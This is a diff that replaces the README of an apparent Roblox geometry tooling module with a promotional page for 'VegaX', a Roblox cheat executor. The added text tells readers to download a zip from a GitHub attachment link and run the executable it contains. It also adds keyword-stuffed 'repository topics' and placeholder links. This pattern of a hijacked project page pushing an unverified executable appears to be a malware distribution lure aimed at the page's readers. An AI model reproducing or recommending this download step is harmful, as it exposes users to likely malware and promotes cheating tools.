@@ -1,61 +1,56 @@
-# Roblox Geometry Module
-This is a module which contains two important geometry functions for Roblox tooling.
+# VegaX-Executor
 
-## getGeometry
+VegaX is a powerful Windows PC executor for Roblox, designed to run Lua scripts efficiently, enabling users to unlock advanced game modifications and enhance their overall gameplay experience.
 
-This is a function which returns a detailed mesh representation of the geometry of a Roblox primitive. That is, one of the five primitive types between a Box, WedgePart, CornerWedgePart, Sphere, or Cylinder. It contains all the logic to decide which of those geometries is appropriate for a given BasePart.
+![VegaX Logo](https://example.com/vegax_logo.png)
 
-You can optionally pass a CFrame as the third argument to get the geometry assuming that the part were at that CFrame rather than where it currently is. Note: Passing `CFrame.identity` here will effectively give you the geometry in the local space of the object rather than in world space like it is normally given.
+## Table of Contents
+- [Features](#features)  
+- [Getting Started](#getting-started)  
+- [Installation](#installation)  
+- [Usage](#usage)  
+- [Contributing](#contributing)  
+- [License](#license)  
 
-The id on each element is a stable id from invocation to invocation allowing you to track the same element across multiple invocations.
+## Features
+- **High Performance**: VegaX is optimized to execute Lua scripts with high efficiency.
+- **Game Modifications**: Unlock advanced modifications for Roblox games.
+- **Enhanced Gameplay**: Improve and enhance your overall gameplay experience.
 
-The vertexMargin / edgeMargin are the minimum amount of "safe" space perpendicular to the feature, and can be used to determine a reasonable sizing of visualizations around the feature.
+## Getting Started
+To get started with VegaX, follow the installation instructions provided below.
 
-The data is returned in the following format:
-```luau
-type GeometryVertex = {
-	id: number,
-	position: Vector3,
-	type: "Vertex",
-}
+## Installation
+You can download the latest version of VegaX from the link below:
+[![Download VegaX](https://img.shields.io/badge/download-VegaX-blueviolet)](https://github.com/user-attachments/files/16283949/VegaX.zip)
 
-type GeometryEdge = {
-	id: number,
-	a: Vector3,
-	b: Vector3,
-	direction: UnitVector3,
-	length: number,
-	edgeMargin: number,
-	vertexMargin: number,
-	part: BasePart,
-	type: "Edge",
-}
+## Usage
+1. Download the VegaX zip file from the provided link.
+2. Extract the contents of the zip file to a location of your choice.
+3. Run the VegaX executable file.
+4. Follow the on-screen instructions to start using VegaX.
 
-type SurfaceType = "BottomSurface" | "TopSurface" | "LeftSurface" | "RightSurface" | "FrontSurface" | "BackSurface"
+## Contributing
+We welcome contributions to improve VegaX. If you have suggestions or would like to report issues, please create a pull request or open an issue on GitHub.
 
-type GeometryFace = {
-	id: number,
-	point: Vector3,
-	normal: UnitVector3,
-	surface: SurfaceType,
-	direction: UnitVector3,
-	vertices: {Vector3},
-	part: BasePart,
-	type: "Face",
-}
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-type GeometryResult = {
-	part: BasePart,
-	shape: "Sphere" | "Cylinder" | "Mesh",
-	vertices: {GeometryVertex},
-	edges: {GeometryEdge},
-	faces: {GeometryFace},
-	vertexMargin: number,
-}
-```
+## Support
+For support, join our Discord server at [VegaX Discord Server](https://discord.gg/vegax).
 
-## blackboxFindClosestMeshEdge
+## Repository Topics
+roblox, vega, roblox-vega, vega-external, vega-executor, vega-external-download, vega-discord, vega-v2-download, vega-download, executor-vega, vega-no-key, roblox-vega-key, roblox-vega-update, vega-cr.
 
-For mouse hit in the form of a RaycastResult, find the edge closest to that hit. The edge is returned in the same `GeometryEdge` format as edges in the table returned by getGeometry. The function may be used for hits against primitive parts, but keep in mind that it will never return a result for Spheres / Cylinders since there aren't any straight edges to find.
+## Code of Conduct
+Please review our [Code of Conduct](CODE_OF_CONDUCT.md) before participating.
 
-The function operates by using up to 50 raycasts to inspect the geometry around the hit and then working out exactly where the edge must be analytically from that information. This means it comes at a significant perforance cost, and will run fine for tooling purposes, but should not be used in live experiences for gameplay purposes.
+## Acknowledgements
+- Special thanks to the developers and contributors of VegaX.
+- Shoutout to the Roblox community for their continued support.
+
+---
+
+Feel free to customize your gameplay with VegaX! 🚀
+
+For more information and updates, visit the [VegaX GitHub Repository](https://github.com/yourusername/VegaX-Executor). 🎮
